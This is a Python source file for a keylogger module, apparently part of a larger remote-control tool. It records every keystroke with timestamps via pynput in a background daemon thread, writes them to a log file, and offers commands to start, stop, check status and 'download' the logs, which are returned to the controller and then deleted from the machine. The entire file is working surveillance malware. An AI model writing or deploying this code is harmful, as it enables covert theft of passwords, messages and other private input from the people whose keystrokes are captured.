import threading
import time
import sys
import os

from pynput.keyboard import Key, Listener

from foreign.parse.crash_exception_handling import *
from foreign.global_state import *


@crash_exception_handling
def keylogger_action():
  def on_press(key):
    if not state['keylogger']['running']:
      state['keylogger']['thread'] = None
      sys.exit(0)

    result = ''
    timestamp = time.strftime("%Y-%m-%d (%H-%M-%S): ")

    key = str(key)
    if key.startswith('\'') and key.endswith('\''):
      key = key[1:-1]
    elif key.startswith('Key.'):
      key = key[4:]

    if state['keylogger']['first']:
      if key not in ('space', 'enter'):
        result = timestamp
      state['keylogger']['first'] = False
    
    if len(key) > 1:
      result += f'[{key}]'  
    else:
      result += key

    if key in ('space', 'enter'):
      result = f'\n{timestamp}{result}'
    
    with open(f'{state["root"]}/{state["keylogger"]["file"]}', 'a') as f:
      f.write(result)

  with Listener(on_press=on_press) as L:
    L.join()


def keylogger(action_type):
  if action_type == 'run':
    if not state['keylogger']['running']:
      state['keylogger']['running'] = True
      
      if state['keylogger']['thread']:
        if not state['keylogger']['thread'].isAlive():    
          state['keylogger']['thread'] = threading.Thread(target=keylogger_action, daemon=True)
          state['keylogger']['thread'].start()
      else:
        state['keylogger']['thread'] = threading.Thread(target=keylogger_action, daemon=True)
        state['keylogger']['thread'].start()
      return {'message': 'Keylogger thread started', 'text_mode': 'primary', 'text_extras': {'point': True}} 
    else:
      return {'message': 'Keylogger is already running', 'text_mode': 'warning'}
  elif action_type == 'download':
    if os.path.isfile(f'{state["root"]}/{state["keylogger"]["file"]}'):
      with open(f'{state["root"]}/{state["keylogger"]["file"]}', 'rb') as log:
        file_data = log.read()
      os.remove(f'{state["root"]}/{state["keylogger"]["file"]}')
      state['keylogger']['first'] = True
      return {'message': 'Keylogger logs successfully downloaded', 'text_mode': 'success', 'logs': file_data}
    else:
      return {'message': 'No keylogger logs available for download', 'text_mode': 'warning'}
  elif action_type == 'close':
    if state['keylogger']['running']:
      state['keylogger']['running'] = False
      return {'message': 'Keylogger successfully closed', 'text_mode': 'success'}
    else:
      return {'message': 'Keylogger is not running', 'text_mode': 'warning'}
  elif action_type == 'status':
    if state['keylogger']['running']:
      return {'message': 'Keylogger is currently running', 'text_mode': 'primary'}
    else:
      return {'message': 'Keylogger is not running', 'text_mode': 'warning'}
  else:
    raise Exception('Error message')